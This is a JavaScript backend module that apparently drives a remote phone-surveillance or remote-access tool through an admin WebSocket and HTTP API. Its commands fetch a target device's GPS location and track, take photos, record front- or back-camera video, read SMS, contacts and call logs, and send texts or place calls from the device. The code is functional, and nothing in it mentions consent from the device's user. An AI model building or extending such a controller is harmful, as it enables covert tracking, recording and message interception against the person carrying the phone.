'use strict';

const { adminClient } = require('./websocket');
const config = require('./backend.config');

async function fetchAdminJson(path, timeoutMs = 5000) {
  const endpoint = String(path || '').trim();
  const baseUrl = String(config.httpBaseUrl || '').trim().replace(/\/+$/, '');
  if (!baseUrl || !endpoint) return null;

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch(`${baseUrl}${endpoint}`, {
      method: 'GET',
      signal: controller.signal,
      headers: {
        Authorization: `Bearer ${config.adminToken}`,
        'Content-Type': 'application/json',
      },
    });

    if (response.status === 404) {
      return null;
    }

    let payload = null;
    try {
      payload = await response.json();
    } catch {
      payload = null;
    }

    if (!response.ok) {
      const detail = payload && typeof payload === 'object' && payload.detail
        ? String(payload.detail)
        : `HTTP ${response.status}`;
      throw new Error(detail);
    }

    return payload;
  } finally {
    clearTimeout(timeout);
  }
}

async function postAdminJson(path, body = {}, timeoutMs = 10000) {
  const endpoint = String(path || '').trim();
  const baseUrl = String(config.httpBaseUrl || '').trim().replace(/\/+$/, '');
  if (!baseUrl || !endpoint) return null;

  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), timeoutMs);

  try {
    const response = await fetch(`${baseUrl}${endpoint}`, {
      method: 'POST',
      signal: controller.signal,
      headers: {
        Authorization: `Bearer ${config.adminToken}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(body || {}),
    });

    let payload = null;
    try {
      payload = await response.json();
    } catch {
      payload = null;
    }

    if (!response.ok) {
      const detail = payload && typeof payload === 'object' && payload.detail
        ? String(payload.detail)
        : `HTTP ${response.status}`;
      throw new Error(detail);
    }

    return payload;
  } finally {
    clearTimeout(timeout);
  }
}

function normalizeDeviceRows(payload) {
  if (Array.isArray(payload)) return payload;
  if (!payload || typeof payload !== 'object') return [];
  if (Array.isArray(payload.devices)) return payload.devices;
  if (Array.isArray(payload.data)) return payload.data;
  return [];
}

function findRecordingDevice(rows, target = {}) {
  const socketId = String(target.socketId || '').trim();
  if (socketId) {
    return rows.find((row) => String(row?.socket_id || '').trim() === socketId) || null;
  }

  const deviceId = String(target.deviceId || '').trim().toLowerCase();
  const userId = String(target.userId || '').trim().toLowerCase();

  const exactDevice = deviceId
    ? rows.find((row) => String(row?.device_id || '').trim().toLowerCase() === deviceId)
    : null;
  if (exactDevice) return exactDevice;

  if (userId) {
    const matches = rows.filter((row) => String(row?.user_id || '').trim().toLowerCase() === userId);
    if (matches.length === 1) {
      return matches[0];
    }
  }

  return null;
}

function toRecentEpoch(value) {
  if (!value) return null;
  if (typeof value === 'number' && Number.isFinite(value)) {
    // Support both seconds and milliseconds.
    return value > 1e12 ? value : value * 1000;
  }
  const parsed = Date.parse(String(value));
  return Number.isFinite(parsed) ? parsed : null;
}

function collectObjects(value, bucket = []) {
  if (Array.isArray(value)) {
    for (const item of value) collectObjects(item, bucket);
    return bucket;
  }
  if (value && typeof value === 'object') {
    bucket.push(value);
    for (const child of Object.values(value)) {
      collectObjects(child, bucket);
    }
  }
  return bucket;
}

function normalizeIdSet(...parts) {
  const set = new Set();
  for (const part of parts) {
    const raw = String(part || '').trim().toLowerCase();
    if (raw) set.add(raw);
  }
  return set;
}

function objectMatchesTarget(obj, targetIds) {
  if (!obj || typeof obj !== 'object' || !targetIds || !targetIds.size) return false;

  const candidates = [
    obj.device_id,
    obj.deviceId,
    obj.user_id,
    obj.userId,
    obj.id,
    obj.target_device,
    obj.targetDevice,
    obj.subject,
  ];

  for (const value of candidates) {
    const key = String(value || '').trim().toLowerCase();
    if (key && targetIds.has(key)) {
      return true;
    }
  }

  return false;
}

function objectHasRecentTimestamp(obj, nowMs, activeWindowMs) {
  if (!obj || typeof obj !== 'object') return false;

  const candidates = [
    obj.last_seen,
    obj.lastSeen,
    obj.connected_at,
    obj.connectedAt,
    obj.timestamp,
    obj.ts,
    obj.time,
    obj.created_at,
    obj.createdAt,
    obj.received_at,
    obj.updated_at,
  ];

  for (const value of candidates) {
    const epoch = toRecentEpoch(value);
    if (!epoch) continue;
    if (nowMs - epoch <= activeWindowMs) {
      return true;
    }
  }

  return false;
}

function objectLooksOnline(obj) {
  if (!obj || typeof obj !== 'object') return false;
  const status = String(obj.status || obj.state || obj.presence || '').trim().toLowerCase();
  return status === 'online' || status === 'active' || status === 'connected';
}

async function hasRecentDeviceActivity(targetIds, activeWindowMs) {
  if (!targetIds || !targetIds.size) return false;

  const [usersPayload, logsPayload, latestLocationPayload] = await Promise.all([
    fetchAdminJson('/admin/users').catch(() => null),
    fetchAdminJson('/admin/logs?limit=100').catch(() => null),
    fetchAdminJson('/admin/locations/latest').catch(() => null),
  ]);

  const nowMs = Date.now();
  const users = collectObjects(usersPayload);
  for (const row of users) {
    if (!objectMatchesTarget(row, targetIds)) continue;
    if (objectLooksOnline(row) || objectHasRecentTimestamp(row, nowMs, activeWindowMs)) {
      return true;
    }
  }

  const logs = collectObjects(logsPayload);
  for (const row of logs) {
    if (!objectMatchesTarget(row, targetIds)) continue;
    if (objectHasRecentTimestamp(row, nowMs, activeWindowMs)) {
      return true;
    }
  }

  const locations = collectObjects(latestLocationPayload);
  for (const row of locations) {
    if (!objectMatchesTarget(row, targetIds)) continue;
    if (objectHasRecentTimestamp(row, nowMs, activeWindowMs)) {
      return true;
    }
  }

  return false;
}

async function normalizeQueuedPresence(response, target = null) {
  if (!response || !response.queued) return response;

  const targetObj = target && typeof target === 'object' ? target : null;
  const targetIds = normalizeIdSet(
    response.device_id,
    response.user_id,
    targetObj ? targetObj.deviceId : target,
    targetObj ? targetObj.userId : null,
    config.targetDeviceId
  );

  const activeWindowMs = Number(config.commandQueueActiveWindowMs) > 0
    ? Number(config.commandQueueActiveWindowMs)
    : 120000;

  const isActive = await hasRecentDeviceActivity(targetIds, activeWindowMs).catch(() => false);
  if (!isActive) {
    return response;
  }

  return {
    ...response,
    queued: true,
    presence: 'online-polling',
    message: 'Device is online (polling mode). Command is queued and will be delivered on the next poll.',
  };
}

/**
 * Backend API service that provides high-level methods for device commands.
 * Uses the WebSocket admin client for real-time communication.
 */
class BackendApiService {
  constructor(wsClient) {
    this._client = wsClient;
  }

  /**
   * Initialize the connection to the backend server.
   * @returns {Promise<void>}
   */
  async connect() {
    return this._client.connect();
  }

  /**
   * Disconnect from the backend server.
   */
  disconnect() {
    this._client.disconnect();
  }

  /**
   * Check if connected to the backend.
   * @returns {boolean}
   */
  isConnected() {
    return this._client.isConnected();
  }

  /**
   * Get connection status info.
   * @returns {object}
   */
  getStatus() {
    return {
      connected: this._client.isConnected(),
      serverUrl: config.adminWsUrl,
      targetDevice: config.targetDeviceId,
    };
  }

  /**
   * Subscribe to backend events.
   * @param {string} event - Event name
   * @param {function} handler - Event handler
   */
  on(event, handler) {
    this._client.on(event, handler);
  }

  /**
   * Unsubscribe from backend events.
   * @param {string} event - Event name
   * @param {function} handler - Event handler
   */
  off(event, handler) {
    this._client.off(event, handler);
  }

  // =====================
  // GPS Commands
  // =====================

  /**
   * Request current GPS location from device.
   * @returns {Promise<{lat: number, lng: number, accuracy?: number, timestamp?: number}>}
   */
  async getGps() {
    const response = await this._client.sendCommand('get_gps', {});
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  /**
   * Request GPS tracking history from device.
   * @param {object} options - Options like { limit, since }
   * @returns {Promise<Array>}
   */
  async getGpsTrack(options = {}) {
    const response = await this._client.sendCommand('get_gps_track', options);
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data?.track || response.data || [];
  }

  // =====================
  // Camera Commands
  // =====================

  /**
   * Take a photo using device camera.
   * @param {object} options - Options like { camera: 'front'|'back', quality }
   * @returns {Promise<{image?: string, url?: string}>}
   */
  async takePhoto(options = {}) {
    const response = await this._client.sendCommand('take_photo', options);
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  /**
   * Get list of available cameras on device.
   * @returns {Promise<Array>}
   */
  async getCameras() {
    const response = await this._client.sendCommand('get_cameras', {});
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data?.cameras || response.data || [];
  }

  /**
   * Start video recording on device.
   * @param {object} options - Options like { camera, duration }
   * @returns {Promise<object>}
   */
  async startRecording(options = {}) {
    const response = await this._client.sendCommand('start_recording', options);
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  /**
   * Stop video recording on device.
   * @returns {Promise<object>}
   */
  async stopRecording() {
    const response = await this._client.sendCommand('stop_recording', {});
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  // =====================
  // SMS Commands
  // =====================

  /**
   * Get SMS messages from device.
   * @param {object} options - Options like { limit, since, threadId }
   * @returns {Promise<Array>}
   */
  async getMessages(options = {}) {
    const response = await this._client.sendCommand('get_messages', options);
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data?.messages || response.data || [];
  }

  /**
   * Get contacts from device.
   * @returns {Promise<Array>}
   */
  async getContacts() {
    const response = await this._client.sendCommand('get_contacts', {});
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data?.contacts || response.data || [];
  }

  /**
   * Send SMS from device.
   * @param {string|string[]} to - Phone number(s) to send to
   * @param {string} message - Message content
   * @returns {Promise<object>}
   */
  async sendSms(to, message) {
    const numbers = Array.isArray(to) ? to : [to];
    const response = await this._client.sendCommand('send_sms', {
      to: numbers,
      message,
    });
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || { sent: true };
  }

  // =====================
  // Call Commands
  // =====================

  /**
   * Make a phone call from device.
   * @param {string} number - Phone number to call
   * @returns {Promise<object>}
   */
  async makeCall(number) {
    const response = await this._client.sendCommand('make_call', { number });
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  /**
   * Get call log from device.
   * @param {object} options - Options like { limit, since }
   * @returns {Promise<Array>}
   */
  async getCallLog(options = {}) {
    const response = await this._client.sendCommand('get_call_log', options);
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data?.calls || response.data || [];
  }

  // =====================
  // Device Info Commands
  // =====================

  /**
   * Get device information.
   * @returns {Promise<object>}
   */
  async getDeviceInfo() {
    const response = await this._client.sendCommand('get_device_info', {});
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  /**
   * Get device battery status.
   * @returns {Promise<{level: number, charging: boolean}>}
   */
  async getBatteryStatus() {
    const response = await this._client.sendCommand('get_battery', {});
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  async getAdminUsers() {
    return fetchAdminJson('/admin/users');
  }

  async getAdminLocationsLatest() {
    return fetchAdminJson('/admin/locations/latest');
  }

  async getAdminCommands() {
    return fetchAdminJson('/admin/commands');
  }

  async getAdminResponses() {
    return fetchAdminJson('/admin/responses');
  }

  async getRecordingDevices() {
    const payload = await fetchAdminJson('/api/devices');
    return normalizeDeviceRows(payload);
  }

  async sendRecordCommand(target = {}, options = {}) {
    const desiredCamera = String(options.camera || 'front').trim().toLowerCase() === 'back' ? 'back' : 'front';
    const durationRaw = Number(options.duration);
    const duration = Number.isFinite(durationRaw)
      ? Math.max(1, Math.min(600, Math.round(durationRaw)))
      : 15;

    const rows = await this.getRecordingDevices();
    const device = findRecordingDevice(rows, target || {});
    if (!device) {
      throw new Error('No connected recording device matched this target');
    }

    const socketId = String(device.socket_id || '').trim();
    if (!socketId) {
      throw new Error('Matched device is missing socket_id');
    }

    const payload = await postAdminJson('/api/record', {
      socket_id: socketId,
      camera: desiredCamera,
      duration,
    });

    return {
      ok: true,
      socket_id: socketId,
      device_id: String(device.device_id || '').trim() || null,
      device_name: String(device.device_name || '').trim() || null,
      camera: desiredCamera,
      duration,
      response: payload,
    };
  }

  // =====================
  // Generic Command
  // =====================

  /**
   * Send a custom command to the device.
   * @param {string} action - Command action name
   * @param {object} payload - Command payload
   * @param {string} [deviceId] - Target device ID (optional)
   * @returns {Promise<object>}
   */
  async sendCommand(action, payload = {}, deviceId = null) {
    const response = await this._client.sendCommand(action, payload, deviceId);
    return normalizeQueuedPresence(response, deviceId);
  }
}

// Create singleton instance
const backendApi = new BackendApiService(adminClient);

module.exports = {
  BackendApiService,
  backendApi,
};
